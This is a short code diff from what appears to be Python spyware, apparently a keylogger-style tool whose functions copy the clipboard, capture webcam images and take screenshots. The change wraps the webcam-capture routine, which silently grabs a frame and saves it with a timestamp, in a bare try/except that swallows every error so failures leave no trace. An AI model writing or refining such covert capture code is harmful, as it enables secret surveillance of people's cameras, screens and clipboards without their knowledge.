@@ -56,12 +56,15 @@ def copy_clipboard():
 
 # Captures Webcam using cv2 module
 def capture_webcam():
-    camera = cv2.VideoCapture(0)
-    time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
-    check, frame = camera.read()
-    cv2.waitKey(0)  # waits 0 milliseconds after each keypress
-    camera.release()
-    cv2.imwrite(file_path + extend + time_str + camera_information, frame)
+    try:
+        camera = cv2.VideoCapture(0)
+        time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
+        check, frame = camera.read()
+        cv2.waitKey(0)  # waits 0 milliseconds after each keypress
+        camera.release()
+        cv2.imwrite(file_path + extend + time_str + camera_information, frame)
+    except:
+        pass
 
 
 # Capture Screenshots using imgrb or pyscreenshot module
